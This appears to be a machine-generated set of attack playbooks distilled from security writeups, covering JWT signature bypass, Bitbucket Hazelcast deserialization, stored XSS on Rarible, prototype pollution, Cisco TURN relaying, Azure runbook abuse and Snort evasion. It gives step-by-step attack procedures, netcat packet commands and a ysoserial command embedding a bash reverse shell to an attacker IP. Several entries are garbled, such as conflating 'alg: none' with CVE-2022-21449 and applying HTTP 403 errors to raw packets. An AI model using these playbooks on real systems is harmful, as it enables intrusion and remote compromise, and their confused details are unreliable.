payloads_or_patterns: Crafted JWT with an all-zero ECDSA signature (e.g., 'AAAA...'). Specific byte patterns for invalid signatures can be derived from Project Wycheproof test vectors for 'ecdsa_secp256r1_sha256_p1363_test.json' or 'ecdsa_secp256k1_sha256_test.json'. The exact byte representation will depend on the signature format (e.g., P1363 vs. ASN.1).
tools_recommended: Burp Suite: To intercept and modify JWTs, and to send crafted requests.
jwt.io or similar JWT decoding tools: To analyze JWT structure and headers.
Custom scripting (Python, Go, etc.): To generate specifically crafted JWTs with malicious ECDSA signatures.
Project Wycheproof GitHub repository: To obtain test vectors for invalid ECDSA signatures.
success_indicators: The target application accepts the crafted JWT, granting unauthorized access or performing actions intended for a legitimate user.
The application does not return an 'invalid signature' error, contrary to expectations for a valid signature check.
failure_indicators: The target application rejects the JWT with an 'invalid signature' error. This may indicate the target is not vulnerable or has applied patches. Pivot to other vulnerabilities.
No discernible change in application behavior. Re-verify the crafted signature and JWT structure. Ensure correct Java version and algorithm are targeted.

playbooks.impact: Unauthorized access to protected resources or functionality by bypassing JWT signature verification. This can lead to privilege escalation, data exfiltration, or execution of arbitrary actions on behalf of other users.
playbooks.key_lesson: Always ensure JWT validation includes checks for known invalid signature values, in addition to verifying the signature itself, especially when dealing with cryptographic implementations like ECDSA.

meta.title: Exploitation and Sample Vulnerable Application of the JWT Null Signature Vulnerability (CVE-2022-21449)

affected_components: JWT authentication endpoints using ECDSA signatures
tech_stack_fingerprints: Application returns 401 for requests without Authorization header

trigger_conditions.when_to_apply: When a web application relies on JWTs for authentication and uses ECDSA (specifically ES256) for signature verification, and the underlying Java JDK version is vulnerable to CVE-2022-21449.
prerequisites: Target application uses JWT for authentication.
The JWT signature algorithm is identified as ES256.
The underlying Java JDK is within the vulnerable version range (15-18).
applicability_signals: Authorization header is required for accessing protected endpoints.
Responses indicate JWT validation failure when an invalid signature is provided.
Target environment is known or suspected to be running a vulnerable Java JDK version.
skip_if: Application does not use JWTs for authentication.
Application uses HMAC-based JWT algorithms (e.g., HS256).
Application explicitly checks for and rejects null signatures.

recon_steps: Step 1: Identify endpoints requiring JWT authentication by attempting to access various application resources without a token.
Step 2: Analyze successful JWTs or documentation to determine the signature algorithm (e.g., ES256).
Step 3: Attempt to determine the Java JDK version if possible (e.g., via error messages, server banners, or specific endpoint behaviors).
attack_steps: Step 1: Craft a JWT with an empty signature (null signature) by setting the 'alg' header to 'none' (or by manipulating the signature part to be empty/null).
Step 2: Include valid claims in the JWT payload, such as user identification and administrative privileges.
Step 3: Send a request to the protected endpoint with the crafted JWT in the `Authorization: Bearer <JWT>` header.
payloads_or_patterns: eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJzdWIiOiJSaWNrIEFzdGxleSIsImFkbWluIjp0cnVlLCJpYXQiOjE2NTA0NjY1MDIsImV4cCI6MTkwMDQ3MDEwMn0.

Note: The signature part after the second dot should be empty for a null signature. The example above demonstrates a JWT with 'alg: none'. The vulnerability CVE-2022-21449 specifically bypasses signature checks with ECDSA, which often involves manipulating the ECDSA signature itself or providing a malformed one that the JDK incorrectly validates as authentic when the 'alg' header indicates an ECDSA algorithm.
tools_recommended: Burp Suite: To intercept and modify JWTs.
JWT manipulation libraries (e.g., `python-jwt`, `java-jwt`): To programmatically create JWTs.
Online JWT generators (e.g., jwt.io, token.dev): For understanding JWT structure and generating test tokens.
success_indicators: Receiving a 200 OK response instead of a 401 Unauthorized.
Access granted to protected resources or administrative functionalities.
The application behaves as if the JWT was valid and signed correctly.
failure_indicators: Receiving a 401 Unauthorized or 403 Forbidden response with the null signature JWT.
Application explicitly rejects JWTs with 'alg: none' or malformed ECDSA signatures.
A 500 Internal Server Error indicates an unexpected application crash, which might require further debugging but is not a direct success indicator.

playbooks.impact: Attacker can bypass authentication by forging a JWT with a null signature, granting them unauthorized access to protected resources and potentially administrative privileges.
playbooks.key_lesson: When targeting applications that use JWTs with ECDSA algorithms, specifically test for JWT null signature bypass vulnerabilities (CVE-2022-21449) by sending JWTs with a null signature or a manipulated ECDSA signature if the application is Java-based and running a vulnerable JDK version.

meta.title: Psychic Signatures - what you need to know

trigger_conditions.when_to_apply: This vulnerability applies to systems utilizing ECDSA signatures for authentication or integrity checks within Oracle Java versions 15 through 18, and OpenJDK versions 15, 17, and 18.
prerequisites: The target system must be using ECDSA signatures for critical security functions like authentication.
applicability_signals: Use of Oracle Java 15-18 or OpenJDK 15, 17, 18.
skip_if: The target system does not use ECDSA signatures or uses a different cryptographic algorithm.

recon_steps: Step 1: Identify the target's Java version. Check for explicit version information in server headers or application responses.
attack_steps: Step 1: Craft a malicious ECDSA signature that bypasses standard verification checks.
Step 2: Use the crafted signature in an authentication or data integrity context to gain unauthorized access or tamper with data.
payloads_or_patterns: insufficient detail in writeup
tools_recommended: Insufficient detail in writeup. Likely requires custom tools for manipulating ECDSA signatures.
success_indicators: Successful authentication without valid credentials.
Unauthorized modification of data that should be protected by signature checks.
failure_indicators: Standard signature verification failures. This indicates the exploit signature was not crafted correctly or the target is not vulnerable.
If standard signature checks pass, the exploit is not working.

playbooks.impact: An attacker can bypass signature checks, potentially leading to unauthorized access to systems, modification of sensitive data, or impersonation.
playbooks.key_lesson: Always ensure cryptographic implementations are up-to-date and patched, and actively monitor for vulnerabilities related to fundamental cryptographic primitives like ECDSA.

meta.title: AWS's Log4Shell Hot Patch Vulnerable to Container Escape and Privilege Escalation

affected_components: Hotdog OCI hooks for Bottlerocket hosts

trigger_conditions.when_to_apply: When AWS's Log4Shell hot patch solutions (specifically versions prior to the fixed releases) are deployed in an AWS environment or any environment where these patches have been applied.
prerequisites: The target environment must have one of the vulnerable AWS Log4Shell hot patch solutions installed.
applicability_signals: Confirmation that a vulnerable version of the log4j-cve-2021-44228-hotpatch package is installed.
Confirmation that the kubernetes-log4j-cve-2021-44228-node-agent Daemonset is running.
Confirmation that Hotdog OCI hooks are configured on a Bottlerocket host.
skip_if: The environment is confirmed to be running fixed versions of the hot patch solutions (e.g., 1.1-16 for the RPM/Daemonset, 1.02 for Hotdog).
The hot patch service is explicitly disabled.

recon_steps: Step 1: Identify if any AWS Log4Shell hot patch solutions are deployed in the target environment. This may involve checking running processes, installed packages (RPMs), Kubernetes Daemonsets, or OCI hook configurations.
Step 2: Determine the specific version of the hot patch solution in use. If the version is not explicitly stated or discoverable, assume it's vulnerable and proceed with caution.
attack_steps: Step 1: As a process within a container (or an unprivileged process on a host running the patch service), attempt to trigger the vulnerability that allows for container escape or privilege escalation. The specific mechanism depends on the hot patch implementation.
Step 2: For container escape, aim to execute commands on the host operating system from within a container. For privilege escalation, aim to gain root code execution on the host.

Step 3: The writeup does not provide specific exploit payloads or commands, but implies that known container escape and privilege escalation techniques can be leveraged against the vulnerable hot patch service.
payloads_or_patterns: insufficient detail in writeup
tools_recommended: Kubernetes native tools (kubectl) to check Daemonsets and running pods.
Server package managers (e.g., rpm, apt) to check installed packages.
Tools to inspect OCI hook configurations.
Generic container escape and privilege escalation tools (if specific exploit details are discovered).
success_indicators: Successful execution of commands on the host OS from within a container.
Gaining root privileges on the host OS from an unprivileged process.
Observing unexpected processes or files created on the host that originated from a container.
failure_indicators: Container escape or privilege escalation attempts are blocked by host security mechanisms (e.g., SELinux, AppArmor).
No observable change in host environment after attempting exploitation.
Error messages indicating insufficient privileges or invalid operations.

playbooks.impact: An attacker can escape from a container to gain control over the underlying host machine. Unprivileged processes can escalate privileges to root, allowing for arbitrary code execution and full compromise of the host.
playbooks.key_lesson: Always verify the versions of security patching solutions, especially those related to critical vulnerabilities like Log4Shell, as hot patches themselves can introduce new attack vectors.

meta.title: Adobe Acrobat hollowing out same-origin policy
meta.category: XSS, SOP bypass, Open redirect, postMessage

trigger_conditions.when_to_apply: When the Adobe Acrobat browser extension is installed and the user navigates to a PDF file via a URL. The vulnerability exploits the extension's mechanism for loading PDFs within the browser.
prerequisites: Adobe Acrobat browser extension is installed and enabled.
The target user navigates to a PDF file using a URL.
applicability_signals: The browser URL changes to `chrome-extension://efaidnbmnnnibpcajpcglclefindmkaj/viewer.html?pdfurl=<URL_TO_PDF>` when accessing a PDF.
The presence of `documentcloud.adobe.com` in the application's network requests.
skip_if: The Adobe Acrobat browser extension is not installed or is disabled.

recon_steps: Step 1: Navigate to a PDF file URL in a browser where the Adobe Acrobat extension is installed. Observe the URL change to the extension's viewer.html.
Step 2: Inspect the network requests made by the extension to confirm communication with `documentcloud.adobe.com` and the proxy endpoint.
attack_steps: Step 1: Craft a malicious HTML page hosted on a third-party domain (e.g., `attacker.com`).

Step 2: Within this HTML page, create an iframe that loads the Adobe Acrobat extension's viewer page. Crucially, set the `pdfurl` parameter to a malicious URL that the extension will attempt to fetch. This malicious URL should be controlled by the attacker and designed to trigger an XSS payload when processed by the extension.

Step 3: The extension, due to SOP bypass, will fetch content from the `pdfurl`. If the fetched content is an HTML page or can be interpreted as such and contains a script, it can be executed in the context of the extension or the documentcloud.adobe.com domain.

Step 4: The attacker's JavaScript, running within the context of the extension or documentcloud.adobe.com, can then leverage the `postMessage` API to communicate with potentially sensitive windows or frames, effectively bypassing SOP and exfiltrating data or performing actions.

Step 5: The writeup describes a specific XSS payload targeting the `pdfurl` parameter to achieve code execution. The exact payload involves injecting HTML and JavaScript into a crafted URL which the extension then processes.
payloads_or_patterns: The core issue is using a third-party website to control the `pdfurl` parameter. A successful XSS payload would involve injecting JavaScript into the content fetched by the `pdfurl`. For example, if the extension trusts HTML content from `pdfurl` without proper sanitization, an attacker could host an HTML file with `<script>alert('XSS')</script>` at a controlled URL and set `pdfurl` to point there. The writeup implies a more complex chain where the fetched content is then used to trigger `postMessage` to other Adobe domains or user context.
tools_recommended: Burp Suite: To intercept and modify requests, especially to test different `pdfurl` values and observe how the extension processes them.
A simple web server (e.g., Python's http.server): To host malicious HTML/JS files for the `pdfurl` target.
success_indicators: Execution of JavaScript code within the context of the Adobe Acrobat extension's viewer or Adobe Document Cloud domain (e.g., an `alert()` box appearing unexpectedly, or a successful `postMessage` call to an attacker-controlled origin).
Exfiltration of sensitive data (e.g., cookies, session tokens if accessible from the compromised origin) to the attacker's server.
failure_indicators: The extension fails to load the content from the `pdfurl` or renders it as plain text, indicating proper sanitization or lack of HTML interpretation.
No JavaScript execution is observed, and `postMessage` calls do not reach the attacker's listener.
A 403 Forbidden or similar error when trying to fetch content from a malicious URL, suggesting network restrictions.

playbooks.impact: Cross-site scripting (XSS) vulnerability that allows a third-party website to execute arbitrary JavaScript in the context of the Adobe Acrobat extension or Adobe Document Cloud. This could lead to the bypass of the Same-Origin Policy, allowing an attacker to potentially access sensitive user data, impersonate the user on other Adobe services, or perform unauthorized actions.
playbooks.key_lesson: Never allow user-controlled input, especially URLs provided via parameters like `pdfurl`, to be fetched and rendered as executable content (like HTML/JS) without strict sanitization and origin validation, as it can lead to SOP bypass and XSS vulnerabilities.

meta.title: Palisade identifies Wormable Cross-Site Scripting Vulnerability affecting Rarible’s NFT Marketplace

trigger_conditions.when_to_apply: When the target has a profile update API endpoint that accepts an image or photo parameter and performs insufficient input sanitization.
prerequisites: Attacker must have an authenticated account on the target platform.
applicability_signals: User profile update API endpoint identified.
Parameter related to profile image/photo is present in API requests.
WAF (like Cloudflare) is in place but can be bypassed using encoding techniques.
skip_if: Profile update API endpoint strictly validates input and rejects HTML/script tags.
WAF effectively blocks all attempts at HTML/script injection regardless of encoding.

recon_steps: Step 1: Authenticate to the target application and navigate to the user profile section.

Step 2: Identify API calls made during profile updates, specifically looking for parameters related to profile pictures or photos. Use browser developer tools (Network tab) or a proxy like Burp Suite.
Step 3: Analyze the request payload for the profile update API endpoint, noting the parameter name (e.g., 'photo').
attack_steps: Step 1: Construct a malicious payload containing an iframe with a data URL. The data URL should contain a base64 encoded JavaScript snippet (e.g., alert('XSS')).

Step 2: Send a POST request to the identified user profile update API endpoint (e.g., POST /marketplace/api/v4/users/<WALLET_ADDRESS>) with the Authorization header, JWT token, and the crafted payload in the 'photo' parameter.
Step 3: Observe the response for any error messages or success confirmations.
Step 4: If the initial payload is blocked, try different encoding techniques or variations of the data URL within the iframe to bypass WAF.
Step 5: After successful injection, navigate to the attacker's profile or have another user view it to confirm the payload execution in the victim's browser.
payloads_or_patterns:
POST /marketplace/api/v4/users/<WALLET_ADDRESS> HTTP/2
Host: api-mainnet.rarible.com
Content-Type: application/json
Authorization: Bearer <SESSION_TOKEN>

{ "signature": "<SIGNATURE>", "publicKey": "<USER_ID>", "photo": "<IFRAME_PAYLOAD>" }
tools_recommended: Burp Suite (Proxy, Repeater, Intruder for fuzzing payloads)
Browser Developer Tools (for Network tab analysis)
success_indicators: The injected JavaScript executes in the victim's browser when they view the profile (e.g., an alert box appears).
The payload persists across different pages or user interactions within the marketplace.
The response to the profile update request indicates success (e.g., 200 OK) and does not contain error messages related to input validation.
failure_indicators: API returns a 4xx or 5xx error indicating invalid input or a WAF block.
The injected payload does not execute, or the profile update fails.
WAF blocks the request despite encoding attempts (e.g., returns 403 Forbidden).

playbooks.impact: Attacker can inject arbitrary JavaScript into other users' profile pages. This JavaScript executes in the context of the trusted rarible.com domain, allowing for: interception of smart contract interactions, modification of NFT metadata, stealing of sensitive data, and potentially spreading like a worm to other users through social interactions or automatic actions. This could lead to the theft of cryptocurrency and NFTs from compromised wallets.
playbooks.key_lesson: Always validate and sanitize user-controlled input for HTML and script content, especially in profile or content creation features, even when a WAF is in place. Test encoding bypasses for common web vulnerabilities like XSS.

meta.title: Prototype Pollution in fast-xml-parser

trigger_conditions.when_to_apply: When a web application or service utilizes the 'fast-xml-parser' library to parse XML input that can be controlled by an attacker.
prerequisites: The target application or service must be using the 'fast-xml-parser' npm package.
applicability_signals: Usage of the 'fast-xml-parser' library for XML parsing.
User-controlled input is processed as XML.
skip_if: The target application explicitly sanitizes XML input before parsing.
The 'fast-xml-parser' library has been updated to a version that mitigates prototype pollution vulnerabilities.

recon_steps: Identify if the target application uses the 'fast-xml-parser' library by examining dependencies or known libraries.
Determine if XML input is accepted from users and if it's directly passed to the parser.
attack_steps: Step 1: Construct an XML payload containing a '__proto__' key with a nested property, for example: `<__proto__><polluted>hacked</polluted><__proto__>`.
Step 2: Send this crafted XML payload to the target application's endpoint that processes XML input.
Step 3: Analyze the parsed JavaScript object output for the existence of the 'polluted' property or any other properties that indicate successful prototype pollution.
payloads_or_patterns:
```xml
<__proto__><polluted>hacked</polluted><__proto__>
```
tools_recommended: Burp Suite: To intercept and modify HTTP requests containing XML payloads.
Custom scripts (e.g., Python, Node.js): To automate the construction and submission of malicious XML payloads.
success_indicators: The parsed JavaScript object contains a property 'polluted' with the value 'hacked' (or similar injected data).
Observing unexpected behavior in the application that could be attributed to a modified JavaScript prototype.
failure_indicators: The 'polluted' property is not found in the parsed object, and the input is treated as invalid XML.
The application returns an error indicating invalid XML structure, suggesting input sanitization or a different parsing mechanism is in place.

playbooks.impact: Prototype pollution can lead to denial of service, arbitrary JavaScript execution (if chained with other gadgets), or modification of application behavior by altering the prototype of built-in JavaScript objects.
playbooks.key_lesson: Always test XML parsers that convert user-controlled input to JavaScript objects for prototype pollution vulnerabilities by including '__proto__' or 'constructor.prototype' keys in the input.

meta.title: CVE-2022-26133 - Bitbucket Data Center - Java Deserialization Vulnerability

tech_stack_fingerprints: Bitbucket Data Center makes use of Hazelcast

trigger_conditions.when_to_apply: When the Hazelcast port (default 5701) of a Bitbucket Data Center instance is reachable by an attacker.
prerequisites: Hazelcast port must be accessible from the attacker's network.
applicability_signals: Bitbucket instance is running Data Center version.
Hazelcast port (5701) is open and responding.
skip_if: Hazelcast port is not accessible.
A Web Application Firewall (WAF) is blocking traffic to the Hazelcast port.

recon_steps: Step 1: Scan the target IP address for open ports, specifically looking for port 5701.
Step 2: Send a dummy probe packet to port 5701 of the target Bitbucket instance using netcat to retrieve the cluster name. Example probe: printf "\x00\x00\x00\x02\x73\x61" | nc -nv <TARGET_IP> 5701
attack_steps: Step 1: Craft a serialized payload using a tool like YSO_SERIAL_JAR (e.g., CommonsBeanutils1).
Step 2: Construct a packet for the Hazelcast port with the following structure: `size of group name (4 bytes) | group name of Bitbucket cluster | 0xFF 0xFF 0xFF 0x9C | serialized payload`.

Step 3: Send the crafted packet to the Hazelcast port (e.g., 5701) of the target Bitbucket Data Center instance using netcat. Example command structure: `printf "<PACKET_DATA>" | nc -nv <TARGET_IP> 5701`.
payloads_or_patterns: Packet Structure: `\x00\x00\x00\x04<CLUSTER_NAME_LEN>\x00\x00\x00\x9C<PAYLOAD>` (where CLUSTER_NAME_LEN is the 4-byte length of the cluster name and PAYLOAD is the serialized Java object).

Example YSO_SERIAL_JAR command for RCE (using reverse shell): `java -jar /path/to/ysoserial-master-SNAPSHOT.jar CommonsBeanutils1 'bash -i >& /dev/tcp/<ATTACKER_IP>/<ATTACKER_PORT> 0>&1' > payload.bin`
tools_recommended: netcat (nc): for sending crafted network packets.
YSO_SERIAL_JAR: for generating Java deserialization payloads.
Wireshark: for analyzing network traffic and understanding packet structures.
success_indicators: Remote Code Execution (RCE) on the Bitbucket Data Center server, observable by a reverse shell connection from the target to the attacker's machine.
Any unusual network behavior or unexpected responses from the Hazelcast port after sending the payload.
failure_indicators: No response from the Hazelcast port: indicates the port might be closed, filtered, or not running Hazelcast.
A `403 Forbidden` or similar error response: indicates a WAF or other security measure is blocking the request.
No RCE achieved: try different YSO_SERIAL_JAR gadgets or encoding methods.

playbooks.impact: Remote Code Execution (RCE) on the Bitbucket Data Center server, allowing an attacker to potentially gain full control of the server, access sensitive data, and pivot to other systems within the network.
playbooks.key_lesson: Always check network reachability and firewall rules for non-standard ports used by applications, especially when they expose services like Hazelcast which can be vulnerable to deserialization attacks.

meta.title: Multiple Vulnerabilities in Cisco Expressway

tech_stack_fingerprints: TCP port 443 open (for TURN over TCP)

trigger_conditions.when_to_apply: When a Cisco Expressway instance is accessible externally and its TURN server functionality is enabled, allowing for the relaying of traffic.
prerequisites: Cisco Expressway is deployed and accessible externally.
TURN server functionality is enabled on the Expressway.
applicability_signals: Open UDP port 3478.
Open TCP port 3478 or 443.
The Expressway's documentation or configuration indicates TURN server is active.
skip_if: No open ports related to TURN (3478 UDP/TCP, 443 TCP).
Firewall rules block external access to these ports.
TURN server functionality is explicitly disabled.

recon_steps: Step 1: Scan UDP port 3478 on the target IP address for open ports.
Step 2: Scan TCP port 3478 and 443 on the target IP address for open ports.

Step 3: If ports are open, use the 'stunner' tool to probe the TURN server and check for its response to STUN/TURN requests. Look for specific error messages or successful responses indicating it's a TURN server.
attack_steps: Step 1: Use the 'stunner' tool (or a similar STUN/TURN client) to send a STUN 'CreatePermission' request with an arbitrary IP address and port (e.g., 127.0.0.1:80).
Step 2: Follow up with a STUN 'ChannelBind' request to attempt to establish a data channel to the specified IP and port.
Step 3: Observe the response and any potential network traffic or callbacks to determine if the Expressway relayed traffic to the specified internal address.
payloads_or_patterns: stunner --connect <TARGET_URL> --peer <INTERNAL_IP>:<INTERNAL_PORT>
tools_recommended: stunner tool from GitHub (https://github.com/firefart/stunner/)
Nmap for port scanning
success_indicators: Successful 'stunner' execution that indicates traffic was relayed to an internal IP address.
Network-level observation of traffic flowing to an internal host (e.g., via a separate listener or network tap).
Specific error messages or successful bindings from the TURN server indicating it processed the request for an internal IP.
failure_indicators: No open TURN ports found. → Investigate other services.
TURN server rejects all 'CreatePermission' requests or does not relay traffic. → The configuration might be restrictive or the server is not vulnerable.
403 Forbidden or similar access denied errors. → The server is likely protected by a WAF or authorization mechanism.

playbooks.impact: Attacker can relay arbitrary TCP and UDP traffic to internal IP addresses within the network where the Cisco Expressway is deployed. This can lead to accessing internal services, pivoting within the network, or performing further reconnaissance.
playbooks.key_lesson: Always test TURN servers on external-facing devices for unrestricted traffic relaying to internal network segments, as they can be abused for SSRF-like attacks.

meta.title: Abusing Azure Hybrid Workers for Privilege Escalation – Part 2: An Azure PrivSec Story

trigger_conditions.when_to_apply: When an attacker has authenticated access to an Azure environment and can leverage existing Azure Hybrid Runbook Worker configurations.
prerequisites: Attacker has authenticated access to the Azure environment.
An Azure Hybrid Runbook Worker is configured and running within the environment.
applicability_signals: Presence of Azure Automation accounts with Hybrid Runbook Workers configured.
The ability to view or modify runbooks associated with the Hybrid Worker.
skip_if: No Azure Hybrid Runbook Workers are deployed or accessible to the attacker.
The Azure environment has strict network segmentation or firewall rules preventing outbound connections from the Hybrid Worker.

recon_steps: Step 1: Identify Azure Automation accounts within the target Azure subscription.

Step 2: Within the Azure Automation account, identify configured Hybrid Runbook Workers and their associated runbooks. Examine the permissions granted to the service principal or managed identity used by the Hybrid Worker.
attack_steps: Step 1: Create a malicious PowerShell script that performs the desired privilege escalation actions (e.g., enumerating sensitive information, creating new administrative users, or modifying existing configurations).
Step 2: Upload the malicious script as a new runbook or modify an existing legitimate runbook associated with the Hybrid Worker.
Step 3: Schedule or manually trigger the execution of the compromised runbook via the Azure Automation service. The Hybrid Worker will execute the script on the target system.
Step 4: Monitor the execution of the runbook and collect any output or evidence of successful privilege escalation.
payloads_or_patterns: PowerShell script for privilege escalation (specific payload depends on the desired action, e.g., creating a local administrator account on the hybrid worker server).
tools_recommended: Azure Portal for managing Azure Automation accounts and runbooks.
PowerShell ISE or VS Code for authoring PowerShell scripts.
Azure CLI or Azure PowerShell for programmatic interaction with Azure.
success_indicators: The malicious script executes successfully on the hybrid worker machine.
Observable changes in the target system reflecting the privilege escalation (e.g., new user accounts created, administrative privileges gained, sensitive data exfiltrated).
failure_indicators: Runbook execution fails or errors out (check runbook logs for specific error messages).
No observable changes indicating privilege escalation (ensure script logic is correct and permissions are sufficient).
WAF or security controls block the execution of the script or its intended actions.

playbooks.impact: The attacker can gain elevated privileges on the Azure Hybrid Runbook Worker machine, potentially leading to full compromise of the server and any resources it has access to. This can include access to sensitive data, execution of arbitrary code, and further lateral movement within the Azure environment.
playbooks.key_lesson: Always review and audit permissions and runbook content for Azure Hybrid Runbook Workers to prevent unauthorized code execution and privilege escalation.

meta.title: Blinding Snort: Breaking The Modbus OT Preprocessor

trigger_conditions.when_to_apply: When Snort IDS/IPS is deployed with the Modbus OT preprocessor enabled and is inspecting Modbus traffic.
prerequisites: Snort IDS/IPS is running and has the Modbus OT preprocessor enabled.
Network traffic containing Modbus protocol is being inspected by Snort.
applicability_signals: Observed Modbus traffic on the network.
Snort logs indicating Modbus preprocessor activity.
skip_if: Snort is not deployed or the Modbus preprocessor is disabled.
No Modbus traffic is present on the network.

recon_steps: Step 1: Monitor network traffic to identify Modbus protocol usage.
Step 2: If Modbus traffic is identified, confirm that Snort IDS/IPS is present and configured to inspect this traffic, potentially by observing Snort alerts or blocked connections related to Modbus.
attack_steps: Step 1: Craft a malicious Modbus packet with a 'Write File Record' function code (0x15).
Step 2: Set the 'Reference type' field to a value that is not '6' or manipulate other fields to cause an integer overflow in the `SnortModbusCheckRequestLengths` function.
Step 3: Send the crafted Modbus packet to the target Snort IDS/IPS.
Step 4: Observe the behavior of the Snort IDS/IPS. If vulnerable, it should enter an infinite while-loop, ceasing to process new packets and generate alerts.
payloads_or_patterns: Craft a Modbus 'Write File Record' (function code 0x15) PDU where the total length calculation in `SnortModbusCheckRequestLengths` results in an integer overflow, leading to an infinite loop. Specific byte manipulation details are not fully provided in the writeup to construct the exact payload, but the vulnerability lies in the calculation of expected packet sizes.
tools_recommended: Scapy or custom packet crafting tools to generate malformed Modbus packets.
Wireshark to analyze network traffic and confirm Modbus protocol.
Network monitoring tools to observe Snort's responsiveness.
success_indicators: Snort IDS/IPS stops processing new network packets.
Snort IDS/IPS stops generating alerts for subsequent malicious traffic.
High CPU utilization on the Snort system due to the infinite loop.
failure_indicators: Snort IDS/IPS continues to process packets and generate alerts normally → The specific Modbus packet crafted did not trigger the integer overflow, or the Modbus preprocessor is not enabled/vulnerable.

Snort IDS/IPS drops the packet with a standard error (e.g., 403 Forbidden) → A WAF or other security mechanism is blocking the crafted packet before it reaches the vulnerable preprocessor. Try obfuscation or alternative attack vectors.

playbooks.impact: An attacker can blind the Snort IDS/IPS, preventing it from detecting and alerting on subsequent malicious network traffic. This allows an attacker to conduct further attacks or exfiltrate data unnoticed.
playbooks.key_lesson: When analyzing protocol preprocessors in IDS/IPS systems, pay close attention to how length calculations are performed, especially in complex or legacy protocols, as integer overflows can lead to denial-of-service or evasion vulnerabilities.

meta.title: Inside the Black Box | How We Fuzzed Microsoft Defender for IoT and Found Multiple Vulnerabilities

affected_components: Network dissectors loaded by Horizon daemon
tech_stack_fingerprints: References to 'horizon-parser' in Docker image names
HTTP responses mentioning 'Microsoft Azure Defender for IoT'

trigger_conditions.when_to_apply: When the target runs the Horizon component responsible for Deep Packet Inspection (DPI) and loads custom or built-in network dissectors.
prerequisites: Ability to send network traffic to the Microsoft Defender for IoT sensor.
applicability_signals: Target is identified as Microsoft Defender for IoT.
Horizon-Parser Docker image is observed running.
The system loads dissectors implemented via C++ `horizon::protocol::BaseParser` interface.
skip_if: Target is not identified as Microsoft Defender for IoT.
No network dissectors are loaded or processed by the Horizon component.

recon_steps: Step 1: Identify running Docker containers on the sensor machine to confirm the presence of 'traffic-monitor' and 'horizon-parser'.
Step 2: Analyze network traffic captured from the sensor to identify protocols being dissected and potentially infer dissector configurations.
attack_steps: Step 1: Develop a custom dissector that implements the `horizon::protocol::BaseParser` interface, focusing on the `processLayer` function.
Step 2: Utilize a fuzzing framework (e.g., AFL with binary instrumentation) to generate malformed or unexpected network packets targeting the dissector's input.
Step 3: Inject the fuzzing library and instrumented dissector into the Horizon-Parser container.
Step 4: Initiate fuzzing by sending the generated packets to the target's network interface.
Step 5: Monitor the Horizon-Parser container for crashes, hangs, or abnormal memory behavior indicative of memory corruption or denial of service.
payloads_or_patterns: Fuzzed network traffic crafted to trigger parsing errors in dissectors (e.g., malformed packet lengths, invalid field values, unexpected protocol sequences).
tools_recommended: AFL++ (American Fuzzy Lop): For generating diverse test cases.
Binary Instrumentation Tools (e.g., DynamoRIO, PIN): To track code coverage and facilitate deeper fuzzing.
Burp Suite (or similar proxy): To capture and modify network traffic if interactive fuzzing is required.
IDA Pro or Ghidra: For static analysis of dissector binaries if some symbols are available.
success_indicators: Crash of the horizon daemon or horizon-parser process.
Detection of memory corruption vulnerabilities (e.g., buffer overflows, use-after-free) via instrumentation or crash dumps.
Sustained denial of service where the DPI mechanism becomes unresponsive.
failure_indicators: No crashes or abnormal behavior observed after extensive fuzzing (e.g., all fuzzing inputs processed without issue) → Suggests the dissector is robust against current fuzzing strategies. Consider targeting other dissectors or protocol layers.
WAF or other network controls blocking fuzzing traffic → Investigate bypassing or modifying fuzzing traffic patterns.

playbooks.impact: Potential for Denial of Service (DoS) by crashing the DPI engine, leading to a loss of network visibility and threat detection capabilities. Memory corruption could lead to further vulnerabilities like code execution in the context of the Horizon component.
playbooks.key_lesson: When fuzzing network protocol dissectors, focus on generating malformed packet data to trigger memory corruption and DoS vulnerabilities within the parsing logic.

meta.title: CVE-2022-25165: Privilege Escalation to SYSTEM in AWS VPN Client

affected_components: AWS VPN Client service (runs as SYSTEM)
tech_stack_fingerprints: AWS VPN Client application installed on Windows

trigger_conditions.when_to_apply: When the AWS VPN Client (version 2.0.0) is installed and a user can be tricked into importing a malicious OpenVPN configuration file.
prerequisites: AWS VPN Client version 2.0.0 or lower is installed.
Attacker can provide a crafted OpenVPN configuration file to the victim.
applicability_signals: Target system is running Windows.
AWS VPN Client is observed to be installed.
The vulnerability concerns the processing of OpenVPN configuration files.
skip_if: AWS VPN Client version 3.0.0 or higher is installed.

recon_steps: Step 1: Confirm the target system is running Windows.
Step 2: Identify if the AWS VPN Client is installed on the target system.
